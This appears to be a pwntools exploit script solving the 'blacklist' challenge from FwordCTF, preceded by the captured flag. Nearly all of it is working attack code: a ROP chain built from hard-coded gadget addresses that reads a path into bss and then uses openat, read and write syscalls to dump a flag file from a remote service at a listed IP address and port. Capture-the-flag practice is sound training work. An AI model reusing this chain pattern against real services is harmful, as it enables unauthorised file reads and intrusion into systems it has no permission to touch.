#FwordCTF{you_aRe_aw3s0Me_!_you_d1d_i7_again_th1s_Ye4r}
from pwn import *

elf = ELF('./blacklist')
target = process('./blacklist')
target = remote('40.71.72.198', 1236)

sys_ret = p64(0x0000000000426094)
pop_rdi = p64(0x00000000004018ca)
pop_rsi = p64(0x00000000004028b8)
pop_rdx = p64(0x00000000004017cf)
pop_rax = p64(0x0000000000414e53)
ret     = p64(0x000000000040101a)
bss     = p64(0x00000000004de000)
zero    = p64(0)

fd = 0 		#0 works for remote and 1 for local
payload = ret*10
payload += pop_rdi + bss + p64(elf.sym['gets'] + 4)		#get file to be read
payload += pop_rdi + p64(3) + pop_rsi + bss + pop_rdx + p64(0) + pop_rax + p64(257) + sys_ret	#openat syscall
payload += pop_rdi + p64(3) + pop_rsi + bss + pop_rdx + p64(0xff) + pop_rax + zero + sys_ret	#read from file
payload += pop_rdi + p64(fd) + pop_rsi + bss + pop_rdx + p64(0xff) + pop_rax + p64(1) + sys_ret	#write to stdout
target.sendline(payload)

target.sendline("/home/fbi/flag.txt")
#target.sendline("/flag")	#Local

target.interactive()